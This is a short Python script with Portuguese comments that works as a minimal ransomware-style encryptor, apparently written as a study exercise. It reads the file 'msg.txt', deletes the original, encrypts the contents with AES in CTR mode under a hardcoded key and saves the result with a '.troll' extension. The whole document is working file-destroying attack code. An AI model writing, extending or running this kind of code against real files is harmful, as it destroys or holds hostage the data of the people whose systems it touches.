import os
import pyaes

## abrir arquivo a ser atacado

file_name = "msg.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover arquivo original

os.remove(file_name)

## definir chave

key = b'teste12345678901'
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar

crypto_data = aes.encrypt(file_data)

## salvar arq criptografado

new_file = file_name + '.troll'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
